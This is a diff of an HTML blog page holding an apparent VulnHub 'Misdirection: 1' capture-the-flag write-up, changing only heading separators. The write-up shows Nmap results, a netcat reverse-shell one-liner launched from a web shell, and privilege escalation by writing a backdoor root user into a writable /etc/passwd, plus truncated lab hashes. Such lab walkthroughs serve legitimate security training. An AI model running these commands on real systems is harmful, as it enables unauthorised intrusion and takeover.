@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20191010_vulnhub-linsecurity1.html"> « </a>📅 published on <code>11/Oct/2019</code><a href="/posts/20191017_vulnhub-moria11.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/misdirection-1,371/">Misdirection: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_misdirection1/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_misdirection1/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>8080/tcp/http/Apache httpd 2.4.29 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_php_webshell">exploit_php_webshell</a>, <a href="https://github.com/7h3rAm/writeups#exploit_bash_reverseshell">exploit_bash_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudoers">privesc_sudoers</a>, <a href="https://github.com/7h3rAm/writeups#privesc_passwd_writable">privesc_passwd_writable</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Fri Oct 11 12:13:32 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.misdirection1/results/192.168.92.187/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.misdirection1/results/192.168.92.187/scans/xml/_quick_tcp_nmap.xml 192.168.92.187
 Nmap scan report for 192.168.92.187
@@ -92,14 +92,14 @@ http://192.168.92.187:8080/wordpress (Status: 301)
 <h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
 <pre class="nested"><code>ssh: root, brexit
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We use the web shell to spawn a Bash reverse shell and catch it using a local <code>netcat</code> listener:  </p>
 <pre class="nested"><code>nc -nlvp 443
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.92.183 443 &gt;/tmp/f
 </code></pre>
 <p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_misdirection1/screenshot01.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_misdirection1/screenshot02.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>www-data@misdirection&gt; id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@misdirection&gt;  
@@ -120,7 +120,7 @@ www-data@misdirection&gt; users
 root
 brexit
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. We find that the user <code>brexit</code> can run <code>bash</code> with <code>sudo</code> privileges. We also find that the <code>/etc/passwd</code> file has write permissions for group <code>brexit</code>. Combining these two, we need to first switch to user <code>brexit</code> and then modify the <code>/etc/passwd</code> file to add a new entry for a backdoor <code>root</code> user:  </p>
 <pre class="nested"><code>sudo -l
   User www-data may run the following commands on localhost:
@@ -144,7 +144,7 @@ su hacker
 <pre class="nested"><code>cat /root/root.txt
 </code></pre>
 <p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_misdirection1/screenshot10.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>root:$6$PnbVvEMS$OcseJT8lZRrgrW1JBpHJ252SPRxS6Rkh3oVBkrbRBZgHBD1wArL6FcyO5daqaon7waFKwSqbg5fIjFgzU........................
 brexit:$6$51s7qYVw$XbTfXEV2acHRp9vmA7VTxO35OLK9EGZJzDGF9nYaukD3eppHsn2P1ESMr.9rRn/YYO70uiUskfkWP0LyR........................
@@ -152,7 +152,7 @@ brexit:$6$51s7qYVw$XbTfXEV2acHRp9vmA7VTxO35OLK9EGZJzDGF9nYaukD3eppHsn2P1ESMr.9rR
 <h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
 <pre class="nested"><code>0d2c6222bfdd3701e0fa12a9a.......
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/misdirection-1,371/">https://www.vulnhub.com/entry/misdirection-1,371/</a>  </li>
 <li><a href="https://download.vulnhub.com/media/misdirection/Misdirection-Walkthrough.pdf">https://download.vulnhub.com/media/misdirection/Misdirection-Walkthrough.pdf</a>  </li>
